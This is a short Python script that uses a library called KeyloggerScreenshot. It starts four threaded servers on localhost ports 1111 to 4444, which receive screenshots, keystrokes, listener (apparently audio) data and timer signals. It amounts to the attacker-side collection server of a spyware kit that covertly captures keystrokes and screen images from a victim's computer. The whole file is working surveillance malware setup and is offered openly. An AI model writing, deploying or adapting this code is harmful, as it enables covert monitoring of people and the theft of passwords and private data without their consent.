import KeyloggerScreenshot as ks
import threading

ip = "127.0.0.1"

ip_photos, port_photos = ip, 1111
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_keylogger, port_keylogger = ip, 2222
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)

ip_listener, port_listener = ip, 3333
server_listener = ks.ServerListener(ip_listener, port_listener)

ip_time, port_time = ip, 4444
server_time = ks.Timer(ip_time, port_time)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start()